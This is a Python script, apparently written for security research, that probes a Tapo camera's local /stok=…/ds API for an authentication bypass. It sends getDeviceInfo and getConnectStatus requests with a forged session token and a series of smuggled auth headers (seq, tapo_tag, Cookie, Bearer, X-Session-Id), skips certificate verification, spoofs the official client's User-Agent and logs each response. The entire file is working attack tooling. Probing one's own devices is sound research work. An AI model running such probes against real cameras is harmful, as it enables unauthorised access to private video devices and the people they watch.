#!/usr/bin/env python3
"""Auth-header smuggling attempts against /stok=<invalid>/ds."""
import json, ssl, sys, urllib.request

HOST = sys.argv[1] if len(sys.argv) > 1 else "192.168.4.71"
CTX = ssl._create_unverified_context()
BODY = {"method": "multipleRequest", "params": {"requests": [
    {"method": "getDeviceInfo", "params": {"device_info": {"name": ["basic_info"]}}}]}} 
PLAIN = {"method": "getConnectStatus", "params": {}}


def post(path, obj, headers):
    h = {"Content-Type": "application/json", "User-Agent": "Tapo CameraClient Android"}
    h.update(headers)
    r = urllib.request.Request(f"https://{HOST}{path}", data=json.dumps(obj).encode(), headers=h)
    try:
        with urllib.request.urlopen(r, context=CTX, timeout=8) as x:
            return x.status, x.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read()


H = "a" * 64
cases = [
    ("seq only", {"seq": "0"}),
    ("seq+tapo_tag", {"seq": "0", "tapo_tag": H}),
    ("tapo_tag only", {"tapo_tag": H}),
    ("cookie stok", {"Cookie": "stok=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}),
    ("auth bearer", {"Authorization": "Bearer AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}),
    ("X-Session-Id", {"X-Session-Id": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}),
    ("tapo_tag+seq on multi", {"seq": "0", "tapo_tag": H}),
]
for name, hd in cases:
    for path, body in (("/stok=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/ds", PLAIN),
                       ("/stok=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/ds", BODY)):
        st, b = post(path, body, hd)
        j = b[:110]
        print(f"{name:22} {body['method']:15} {st} {j!r}")
